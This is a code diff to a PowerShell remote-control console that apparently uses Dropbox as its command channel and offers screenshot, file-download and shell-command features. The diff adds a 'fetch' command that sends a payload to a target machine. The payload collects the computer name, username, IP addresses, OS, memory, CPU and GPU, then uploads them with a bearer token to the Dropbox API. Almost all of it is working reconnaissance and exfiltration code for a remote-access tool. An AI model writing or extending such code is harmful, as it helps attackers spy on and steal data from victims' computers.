@@ -19,6 +19,7 @@ function Show-Help {
     Write-Host "  profile-details  - Show details of current profile" -ForegroundColor White
     Write-Host ""
     Write-Host "  cmd              - Send a command" -ForegroundColor White
+    Write-Host "  fetch            - Fetch system information" -ForegroundColor White
     Write-Host "  screenshot       - Capture a screenshot" -ForegroundColor White
     Write-Host "  tree             - Capture tree output" -ForegroundColor White
     Write-Host "  download         - Download a file" -ForegroundColor White
@@ -647,6 +648,58 @@ function Clear-Screen {
     }
 }
 
+function Cmd-Fetch {
+    if (-not $CurrentProfile) {
+        Write-Host "No profile selected" -ForegroundColor DarkRed
+        return 
+    }
+
+    $command = @'
+# CMD-FETCH
+$computerName = $env:COMPUTERNAME
+$username = $env:USERNAME
+$ipv4Addresses = @()
+$ipv4Adapters = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { 
+$_.IPAddress -ne '127.0.0.1' -and $_.AddressState -eq 'Preferred'
+}
+foreach ($adapter in $ipv4Adapters) {
+$ipv4Addresses += $adapter.IPAddress
+}
+$ipv4 = if ($ipv4Addresses.Count -gt 0) { $ipv4Addresses -join ', ' } else { 'No IPv4 address found' }
+$ipv6Addresses = @()
+$ipv6Adapters = Get-NetIPAddress -AddressFamily IPv6 | Where-Object { 
+$_.IPAddress -ne '::1' -and $_.AddressState -eq 'Preferred'
+}
+foreach ($adapter in $ipv6Adapters) {
+$ipv6Addresses += $adapter.IPAddress
+}
+$ipv6 = if ($ipv6Addresses.Count -gt 0) { $ipv6Addresses -join ', ' } else { 'No IPv6 address found' }
+$os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
+$memory = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
+$cpu = (Get-WmiObject -Class Win32_Processor).Name
+$gpus = (Get-WmiObject -Class Win32_VideoController).Name
+$gpu = if ($gpus.Count -gt 0) { $gpus -join ', ' } else { 'No GPU found' }
+$output = @"
+Computer Name: $computerName
+Username: $username
+IPv4 Addresses: $ipv4
+IPv6 Addresses: $ipv6
+Operating System: $os
+Total Memory: $memory GB
+CPU: $cpu
+GPU: $gpu
+"@
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
+$fileName = "fetch_$computerName.txt"
+$uri = "https://content.dropboxapi.com/2/files/upload"
+$apiArg = @{path = "/$fileName"; mode = "overwrite"; autorename = $true; mute = $true} | ConvertTo-Json -Compress
+$headers = @{Authorization = "Bearer $accessToken"; "Dropbox-API-Arg" = $apiArg; "Content-Type" = "application/octet-stream"}
+Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $bytes
+'@
+
+    Send-Command -CommandString $command
+}
+
 function Cmd-Screenshot {
     if (-not $CurrentProfile) {
         Write-Host "No profile selected" -ForegroundColor DarkRed
@@ -836,6 +889,9 @@ while (-not $exitRequested) {
         }
         "^(cmd|c)$" {
             Send-Command
+        }
+        "^(fetch|info)$" {
+            Cmd-Fetch
         }
         "^(screenshot|ss)$" {
             Cmd-Screenshot
